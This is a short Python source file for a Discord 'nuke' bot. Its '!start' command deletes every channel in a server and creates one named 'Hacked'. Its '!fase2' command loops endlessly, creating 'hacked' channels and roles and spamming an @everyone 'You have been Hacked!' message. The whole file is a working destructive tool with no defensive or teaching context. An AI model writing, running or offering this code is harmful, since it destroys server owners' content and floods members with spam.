import discord
from discord.ext import commands
from discord.utils import get

bot = commands.Bot(command_prefix='!')

bot.remove_command('help')

@bot.event
async def on_ready():
    print("Bot on")


@bot.command(pass_context=True)
async def start(ctx):
    for c in ctx.guild.channels:
        await c.delete()
    await ctx.message.guild.create_text_channel('Hacked')

@bot.command(pass_context=True)
async def fase2(ctx):
   await ctx.message.delete()
   guild= ctx.message.guild
   while True:
       await guild.create_text_channel('hacked')
       await ctx.guild.create_role(name='hacked')
       await ctx.send("You have been Hacked!@everyone\n")



bot.run("#INSERISCIILTOKENDELBOT")

